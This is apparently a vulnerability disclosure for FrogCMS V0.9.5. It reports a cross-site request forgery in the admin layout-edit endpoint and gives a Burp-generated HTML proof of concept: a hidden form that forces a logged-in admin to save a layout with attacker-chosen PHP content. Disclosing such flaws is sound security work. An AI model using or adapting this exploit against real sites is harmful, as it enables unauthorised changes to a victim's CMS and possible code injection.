
target:https://github.com/philippe/FrogCMS
version: V0.9.5

FrogCMS V0.9.5 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/?/layout/edit/1

POC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/?/layout/edit/1" method="POST">
      <input type="hidden" name="/layout/edit/1" value="" />
<input type="hidden" name="layout%5Bname%5D" value="none12" />
<input type="hidden" name="layout%5Bcontent_type%5D" value="text%2Fhtml" />
<input type="hidden" name="layout%5Bcontent%5D" value="%3C%3Fphp+echo+%24this-%3Econtent%28%29%3B+%3F%3E" />
<input type="hidden" name="commit" value="Save" />

      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
